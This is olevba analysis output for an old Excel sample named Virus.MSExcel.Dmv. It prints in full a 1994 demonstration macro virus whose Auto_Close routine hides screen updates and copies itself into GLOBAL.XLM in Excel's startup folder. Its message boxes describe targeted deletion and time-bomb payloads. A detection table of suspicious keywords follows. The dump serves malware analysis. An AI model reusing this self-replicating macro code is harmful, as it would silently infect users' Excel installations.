olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Dmv-e609ffe1b96531c3a56edfd0ab2fb48c41272aa2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Dmv-e609ffe1b96531c3a56edfd0ab2fb48c41272aa2 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Dmv-e609ffe1b96531c3a56edfd0ab2fb48c41272aa2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Dmv-e609ffe1b96531c3a56edfd0ab2fb48c41272aa2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Dmv-e609ffe1b96531c3a56edfd0ab2fb48c41272aa2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Dmv-e609ffe1b96531c3a56edfd0ab2fb48c41272aa2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Excel Auto_Close DMV
' 12/27/94 by joelm@eskimo.com
'
' This is a quick and dirty demonstration of a DMV running under
' Microsoft Excel 5.0.  It demonstrates the security risks of
' automatic macros.
'
' The code executes when Excel closes.  It infects the global macro file.
' No data files are infected, although it would be possible to add
' additional VBA code to do so (ala the Word DMV.DOC file).

Sub Auto_Close()

'this is the virus propogation code that infects global.xlm

'for testing if global.xlm and virus are already present
globalPresent = 0
virusPresent = 0

'turn screen updating off so the results can't be seen by the user
Application.ScreenUpdating = False
For x = 1 To Application.Workbooks.Count
    'is a global.xlm file present?
    If Application.Workbooks(x).Name = "GLOBAL.XLM" Then
        'it exists
        globalPresent = 1
        'now see if the macro virus has already been installed
        For y = 1 To Application.Workbooks("GLOBAL.XLM").Modules.Count
            'the module with the virus is given an innocent looking
            'name that blends in with the other sheets
            If Application.Workbooks("GLOBAL.XLM").Modules(y).Name = "Sheet01" Then
                virusPresent = 1
                MsgBox "Virus already installed in GLOBAL.XLM"
            End If
        Next
        
        'global.xlm exists, but the virus hasn't been installed, so install
        'it from this file
        If virusPresent = 0 Then
            'make it visible - this is required before a copy
            Windows("GLOBAL.XLM").Visible = True
            'copy this module into it
            MsgBox "GLOBAL.XLM exists.  Adding Auto_Close virus to it."
            Application.Workbooks("DMV.XLS").Modules("Sheet01").Copy after:=Application.Workbooks("GLOBAL.XLM").Modules(1)
            'make it invisible again
            Windows("GLOBAL.XLM").Visible = False
            'save it
            Application.Workbooks("GLOBAL.XLM").Save
        End If
    End If
Next
    'global.xlm doesn't exist, so create one and save macro to
    If globalPresent = 0 Then
        MsgBox "GLOBAL.XLM doesn't exist.  Creating it now."
        'copy the module into the startup directory
        Application.Workbooks("DMV.XLS").SaveCopyAs Application.StartupPath + "\GLOBAL.XLM"
        'now we need to open it up and make it visible
        Application.Workbooks.Open (Application.StartupPath + "\GLOBAL.XLM")
        Windows("GLOBAL.XLM").Visible = False
        'save the change
        Application.Workbooks("GLOBAL.XLM").Save
    End If
    
'turn screen updating back on
Application.ScreenUpdating = True
    
MsgBox "The virus has been spread.  Now execute some other code, for example..."

'this is the code that executes after the virus is spread, some malicious
'examples that use simple VB properties are shown

orgName = Application.OrganizationName
MsgBox ("Just checked which organization Excel was registered to..." + Chr(10) + Chr(10) + "A DMV could selectively target a business, government agency, or organization.  For example, delete all files if this software was licensed to IBM.")

useName = Application.UserName
MsgBox "Just checked who Excel was registered to..." + Chr(10) + Chr(10) + "A DMV could selectively target a specific individual for revenge or eavesdropping."

theCountry = Application.International(xlCountryCode)
MsgBox "Just checked Excel's country code..." + Chr(10) + Chr(10) + "A DMV could selectively target users within a certain country.  For example, overwrite files if an Arabic version of Excel was running."

theDate = Date
MsgBox "Just checked the date..." + Chr(10) + Chr(10) + "A DMV could serve as a time bomb.  For example, start renaming files after September 1995, so it appears problems are related to the release of Microsoft Windows 95."

theOS = Application.OperatingSystem
MsgBox "Just checked the operating system..." + Chr(10) + Chr(10) + "A DMV could only execute if a specific version of an operating system was running."

End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|open                |May open a file                              |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

